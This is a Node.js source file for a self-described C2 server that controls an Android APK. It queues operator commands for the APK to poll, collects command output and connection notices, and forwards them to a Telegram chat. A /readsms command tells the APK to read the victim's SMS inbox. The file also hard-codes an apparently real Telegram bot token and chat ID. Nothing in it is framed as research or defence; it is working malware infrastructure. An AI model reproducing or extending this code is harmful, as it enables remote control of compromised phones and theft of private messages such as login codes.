const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const readline = require('readline');

const TELEGRAM_BOT_TOKEN = '7678670381:AAFPa1p6fFMB7ImwXIMYtjhRJ2arybZZ3io'; // get it from BotFather
const TELEGRAM_CHAT_ID = '8175955990';     // send /start to bot and capture msg.chat.id

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

let latestCommand = '';
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// 🛰️ Web endpoint: APK fetches task
app.get('/task', (req, res) => {
  res.send(latestCommand);
  latestCommand = '';
});

// 📤 APK sends output here
app.post('/result', (req, res) => {
  const out = req.body.output || '[empty]';
  console.log(`📥 Output from APK:\n${out}`);
  bot.sendMessage(TELEGRAM_CHAT_ID, `📥 APK Output:\n${out}`);
  res.send('OK');
});

// 🔔 Notify on connect (triggered by APK connection)
app.post('/notify', (req, res) => {
  console.log('[+] APK Connected');
  bot.sendMessage(TELEGRAM_CHAT_ID, '📡 APK Connected');
  res.send('pong');
});

// 🧠 CLI for manual commands
function promptCommand() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.setPrompt('C2 > ');
  rl.prompt();

  rl.on('line', (line) => {
    latestCommand = line.trim();
    rl.prompt();
  });
}

// 💬 Telegram commands
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, '🤖 Bot online');
});

bot.onText(/\/readsms/, (msg) => {
  latestCommand = 'content://sms/inbox'; // Android shell command to read SMS (Termux-like)
  bot.sendMessage(msg.chat.id, '📤 Sent readsms command to APK.');
});

// 🚀 Start server
app.listen(3000, () => {
  console.log('🔐 C2 server running on http://0.0.0.0:3000');
  promptCommand();
});
